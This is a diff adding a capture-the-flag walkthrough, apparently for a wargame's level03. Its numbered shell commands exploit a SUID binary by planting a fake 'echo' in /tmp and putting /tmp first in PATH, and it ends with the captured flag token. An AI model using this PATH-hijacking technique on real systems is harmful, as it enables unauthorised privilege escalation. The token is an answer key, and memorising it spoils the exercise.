@@ -1,0 +1,34 @@
+1. List files in the directory:
+   ll
+   # Output shows: level03 binary with SUID permissions (rwsr-sr-x) owned by flag03
+
+2. Execute the binary to see what it does:
+   ./level03
+   # Output: Exploit me
+
+3. Analyze the binary to find how it works:
+   strings level03 | grep echo
+   # Output: /usr/bin/env echo Exploit me
+
+4. Check current PATH:
+   echo $PATH
+   # Shows the directories where commands are searched
+
+5. Create a malicious echo command:
+   echo 'getflag' > /tmp/echo
+   chmod +x /tmp/echo
+
+6. Modify PATH to prioritize our malicious echo:
+   export PATH=/tmp:$PATH
+
+7. Verify PATH is modified:
+   echo $PATH
+   # /tmp is now first in PATH
+
+8. Execute the binary again:
+   ./level03
+   # Now it executes our /tmp/echo instead of /usr/bin/echo
+   # Output: Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+TECHNIQUE: PATH hijacking attack on SUID binary
+TOKEN: qi0maab88jeaj46qoumi7maus
